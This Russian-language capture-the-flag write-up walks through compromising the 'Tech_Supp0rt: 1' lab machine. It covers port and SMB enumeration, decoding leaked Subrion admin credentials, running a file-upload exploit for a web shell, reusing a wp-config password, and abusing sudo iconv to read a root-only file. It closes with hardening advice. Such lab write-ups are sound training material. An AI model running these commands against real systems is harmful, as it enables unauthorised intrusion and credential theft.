# Отчет по прохождению Tech_Supp0rt: 1

## 1. Разведка (Reconnaissance)

### Сканирование портов

Выполнено сканирование с использованием Nmap:

```bash
sudo nmap -sC -sV 10.49.161.162 -T5 -p- -v -o nmap.log
```

**Результаты:**

- 22/tcp — SSH (OpenSSH 7.2p2 Ubuntu)
- 80/tcp — HTTP (Apache httpd 2.4.18)
- 139/tcp — netbios-ssn (Samba)
- 445/tcp — netbios-ssn (Samba 4.3.11-Ubuntu)

### Анализ веб-приложения

На порту 80 обнаружена стандартная страница Apache.

### Фаззинг директорий

```bash
gobuster dir -u "http://10.49.161.162" -w /usr/share/wordlists/dirb/big.txt -r
```

Найдена директория `/test` (Status: 200, Size: 20677). В исходном коде страницы обнаружен закомментированный путь:

```html
<!--<script type="text/javascript" src="../../bbmaster.js"></script>-->
```

Результатов не дало.

---

## 2. Анализ SMB-шаров

### Перечисление шаров

```bash
smbclient -L //10.49.161.162/
```

Обнаружены следующие шары:

- `print$` — драйверы принтеров
- `websvr` — неизвестный диск
- `IPC$` — IPC-сервис

### Подключение к шаре websvr

```bash
smbclient //10.49.161.162/websvr
```

Скачан файл `enter.txt`.

**Содержимое:**

```
GOALS
=====
1) Make fake popup and host it online on Digital Ocean server
2) Fix subrion site, /subrion doesn't work, edit from panel
3) Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

## 3. Анализ Subrion CMS

### Попытка доступа к /subrion

Прямой доступ к `http://10.49.161.162/subrion/` недоступен (ошибка маршрутизации на внутренний IP 10.0.2.15).

### Найдена панель администратора

`http://10.49.161.162/subrion/panel/`

### Декодирование пароля

Пароль из файла `enter.txt`: `7sKvntXdPEJaxazce9PXi24zaFrLiKWCk`

Процесс декодирования:

1. Base58 → Base32 → Base64 → `Scam2021`

**Учетные данные:** `admin:Scam2021`

### Идентификация версии CMS

Subrion CMS v4.2.1

## 4. Эксплуатация Subrion CMS

### Поиск эксплойта

Обнаружен эксплойт: **Subrion CMS 4.2.1 — Arbitrary File Upload**

### Запуск эксплойта

```bash
python3 exploit.py -u http://10.49.161.162/subrion/panel/ -l admin -p Scam2021
```

### Получение обратной оболочки

После успешной эксплуатации получен доступ с правами `www-data`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 5. Пост-эксплуатация и эскалация привилегий

### Анализ конфигурации WordPress

В директории `/var/www/html/wordpress` найден файл `wp-config.php`.

**Креды базы данных:**

```php
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

### Переключение на пользователя scamsite

Пароль `ImAScammerLOL!123!` подошел для пользователя `scamsite`:

```bash
scamsite@TechSupport:/home$ id
uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
```

### Анализ привилегий sudo

```bash
sudo -l
```

Результат:

```
User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

### Чтение root-флага

Используя уязвимость `iconv` из GTFObins:

```bash
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
```

Флаг получен.

## 6. Выводы и достижения

### Векторы атаки

1. **SMB-шар `websvr`** — утечка учетных данных Subrion CMS
2. **Subrion CMS 4.2.1** — уязвимость загрузки файлов → RCE
3. **WordPress `wp-config.php`** — креды от базы данных → доступ к пользователю `scamsite`
4. **Sudo `iconv`** — чтение root-флага

### Достижения

- Применен эксплойт для Subrion CMS
- Использован GTFObins для `iconv` при эскалации привилегий

### Рекомендации

1. Отключить анонимный доступ к SMB-шарам
2. Обновить Subrion CMS до актуальной версии
3. Не хранить пароли в конфигурационных файлах в открытом виде
4. Не предоставлять пользователю `scamsite` права на запуск `iconv` от root
